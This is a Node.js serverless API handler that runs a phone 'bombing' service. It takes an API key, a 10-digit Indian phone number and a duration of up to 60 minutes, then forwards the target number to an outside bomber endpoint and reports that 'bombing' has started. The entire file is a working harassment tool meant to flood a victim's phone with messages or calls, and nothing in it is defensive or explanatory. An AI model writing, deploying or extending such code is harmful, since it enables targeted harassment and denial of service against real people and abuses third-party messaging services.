const axios = require('axios');

// Load keys from keys.json
const keys = require('/keys.json');

module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { key, number, duration } = req.query;

  // Validate API key
  if (!key || !keys.valid_keys.includes(key)) {
    return res.status(401).json({ 
      error: 'Invalid API key',
      message: 'Please provide a valid API key'
    });
  }

  // Validate phone number
  if (!number) {
    return res.status(400).json({ 
      error: 'Phone number required',
      message: 'Please provide a phone number'
    });
  }

  // Validate phone number format (Indian numbers)
  const phoneRegex = /^[6-9]\d{9}$/;
  if (!phoneRegex.test(number)) {
    return res.status(400).json({ 
      error: 'Invalid phone number',
      message: 'Please provide a valid 10-digit Indian phone number'
    });
  }

  // Set default duration to 10 if not provided
  const bombDuration = duration ? parseInt(duration) : 10;

  // Validate duration
  if (bombDuration < 1 || bombDuration > 60) {
    return res.status(400).json({ 
      error: 'Invalid duration',
      message: 'Duration must be between 1 and 60 minutes'
    });
  }

  try {
    // Make request to the target bomber API
    const targetUrl = `https://freefire-api.ct.ws/bomber4.php?phone=91${number}&duration=${bombDuration}`;
    
    console.log(`Making request to: ${targetUrl}`);
    
    const response = await axios.get(targetUrl, {
      timeout: 30000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    // Parse the response
    let result;
    try {
      result = typeof response.data === 'string' ? JSON.parse(response.data) : response.data;
    } catch (parseError) {
      result = { raw: response.data };
    }

    // Send success response with logs
    res.status(200).json({
      success: true,
      message: `Bombing started for ${number}`,
      duration: bombDuration,
      target: number,
      logs: [
        `Request initiated for: ${number}`,
        `Duration set to: ${bombDuration} minutes`,
        `Target API: ${targetUrl}`,
        `Status: ${response.status}`,
        `Response: ${JSON.stringify(result)}`,
        `Bombing in progress... Check logs for updates`
      ],
      timestamp: new Date().toISOString(),
      response: result
    });

  } catch (error) {
    console.error('Error:', error.message);
    
    res.status(500).json({
      success: false,
      error: 'Bombing failed',
      message: error.message,
      logs: [
        `Failed to initiate bombing for: ${number}`,
        `Error: ${error.message}`,
        `Please try again later`
      ],
      timestamp: new Date().toISOString()
    });
  }
};

